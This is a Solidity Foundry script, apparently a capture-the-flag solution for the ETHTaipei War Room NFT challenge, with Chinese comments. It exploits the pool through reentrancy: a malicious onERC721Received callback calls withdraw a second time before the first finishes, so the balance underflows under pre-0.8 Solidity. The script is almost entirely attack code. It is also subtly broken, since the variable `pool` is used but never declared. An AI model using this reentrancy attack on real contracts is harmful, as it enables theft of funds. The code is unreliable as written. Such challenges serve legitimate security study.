// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {PoolBase} from "../src/ETHTaipeiWarRoomNFT/Pool.sol";
import {IERC721} from "openzeppelin-contracts-07/contracts/token/ERC721/IERC721.sol";
import {WarRoomNFT} from "../src/ETHTaipeiWarRoomNFT/NFT.sol";

contract AttackPoolBase is Script {
    PoolBase public poolBase;
    WarRoomNFT public nft;
    uint256 times = 0;

    function run() public {
        vm.startBroadcast();
        poolBase = new PoolBase(block.timestamp + 100, block.timestamp + 200, 1000);
        poolBase.setup();
        nft = poolBase.nft();
        pool = poolBase.pool();
        uint256 tokenId = poolBase.tokenId();
        nft.approve(address(pool), tokenId);
        pool.deposit(tokenId);
        pool.withdraw(tokenId);
        require(poolBase.isSolved(), "err");
        vm.stopBroadcast();
    }

    function onERC721Received(address, address, uint256 tokenId, bytes memory) external returns (bytes4) {
        if (times < 1) {
            times++;
            nft.safeTransferFrom(address(this), address(pool), 1);
            pool.withdraw(tokenId);
        }
        return this.onERC721Received.selector;
    }
    // chanllanger 是這份attack
    // onERC721Received 在第一次withdraw時還沒完成之前又再發送了第二次withdraw使得 _balances[msg.sender] -= 1 ether扣了兩次
    // 這樣就會有問題，原本的balanc只有1
    // 在0.8.0版本之前沒有針對數字overflow做檢查
}
